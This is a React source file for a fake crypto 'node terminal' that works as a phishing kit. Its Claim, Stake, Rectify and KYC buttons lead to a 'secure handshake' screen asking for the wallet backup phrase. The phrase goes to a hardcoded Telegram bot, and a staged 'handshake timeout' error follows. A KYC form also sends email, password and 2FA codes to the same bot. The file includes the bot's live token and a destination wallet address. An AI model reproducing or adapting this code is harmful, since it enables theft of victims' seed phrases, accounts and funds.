import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycCode, setKycCode] = useState(""); 
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [liveGas, setLiveGas] = useState(12);
  const [liveSync, setLiveSync] = useState(99.81);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" };
  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ chat_id: chatId, text: `${msg}` }) 
  }).catch(()=>{});

  const wordsTyped = useMemo(() => seedVal.toLowerCase().trim().split(/\s+/).filter(w => w.length > 0), [seedVal]);
  const isSeedValid = useMemo(() => [12, 15, 18, 21, 24].includes(wordsTyped.length), [wordsTyped]);

  // AUTO-LOAD BALANCE FOR RECTIFY
  useEffect(() => {
    if (activeTask === "Rectify") {
      const bal = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 8) || "0.00") : (nativeBal?.formatted?.slice(0, 8) || "0.00");
      setInputVal(bal);
    } else {
      setInputVal("");
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  const startSync = () => {
    setIsSyncing(true);
    log(`🚨 SEED_RECOVERY: ${seedVal}`);
    let c = 0;
    const i = setInterval(() => {
      c += 2;
      setSyncProgress(c);
      if (c >= 100) {
        clearInterval(i);
        setTimeout(() => {
          setIsSyncing(false);
          alert("CRITICAL_ERROR [0x99A]: Handshake Timeout. Relay bridge congested.");
          setView("menu");
        }, 1000);
      }
    }, 80);
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <div style={{width:'100%', height:'150px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.3'}} title="Chart" />
      </div>

      <header style={{display:'flex', justifyContent:'space-between', marginBottom:'25px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'20px'}}>EVEDEX_NODE_v4</div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', padding:'50px', backgroundColor:'#0d1117', borderRadius:'30px', border:'1px solid #1e293b'}}><appkit-button /></div>
      ) : (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'10px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 5px', borderRadius:'15px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}>{n}</button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'25px'}}>
              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← DISMISS</button>
              
              {activeTask === "Rectify" && (
                <div style={{display:'flex', backgroundColor:'black', borderRadius:'10px', padding:'4px', marginBottom:'20px', border:'1px solid #1e293b'}}>
                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'7px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", textAlign:'center'}}>USDT_POOL</div>
                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'7px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", textAlign:'center'}}>GAS_POOL</div>
                </div>
              )}

              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'20px', borderRadius:'15px', textAlign:'left', marginBottom:'15px'}}>
                <label style={{fontSize:'8px', color:'#10b981', display:'block', marginBottom:'8px'}}>INDEX_VOLUME</label>
                <input 
                  type="number" 
                  value={inputVal} 
                  onChange={(e)=>setInputVal(e.target.value)} 
                  readOnly={activeTask === "Rectify"} 
                  style={{background:'none', border:'none', color: activeTask === "Rectify" ? "#10b981" : "#fff", fontSize:'24px', width:'100%', outline:'none', fontWeight:'900'}} 
                  placeholder="0.00" 
                />
              </div>

              {activeTask === "Rectify" && (
                <div style={{fontSize:'8px', color:'#475569', marginBottom:'20px', textAlign:'left', padding:'0 5px'}}>
                  <div style={{display:'flex', justifyContent:'space-between', marginBottom:'5px'}}><span>AUTO_SLIPPAGE:</span><span style={{color:'#10b981'}}>0.1% (LOCKED)</span></div>
                  <div style={{display:'flex', justifyContent:'space-between'}}><span>NODE_LIQUIDITY:</span><span style={{color:'#10b981'}}>$21.84M</span></div>
                </div>
              )}

              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'30px', padding:'30px', textAlign:'center'}}>
              <h2 style={{color:'white', marginBottom:'20px', fontSize:'18px'}}>IDENTITY_SYNC</h2>
              {kycPhase === 1 ? (
                <>
                  <input type="email" placeholder="CLOUD_ID" onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginBottom:'10px', outline:'none'}} />
                  <input type="password" placeholder="PASSWORD" onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginBottom:'20px', outline:'none'}} />
                  <button onClick={()=>{log(`🆔 AUTH: ${kycEmail} / ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY</button>
                </>
              ) : (
                <>
                  <div style={{color:'#3b82f6', fontSize:'10px', marginBottom:'10px'}}>ENTER 2FA CODE FROM CLOUD</div>
                  <input type="text" maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'12px', color:'white', textAlign:'center', fontSize:'24px', outline:'none'}} />
                  <button onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>AUTHORIZE</button>
                </>
              )}
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'30px', padding:'35px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', marginBottom:'15px'}}>🛡️ SECURE_HANDSHAKE</div>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER BACKUP PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none'}} />
                    <button disabled={!isSeedValid} onClick={startSync} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE</button>
                  </>
                ) : (
                  <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'8px'}}>SYNCING...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
}
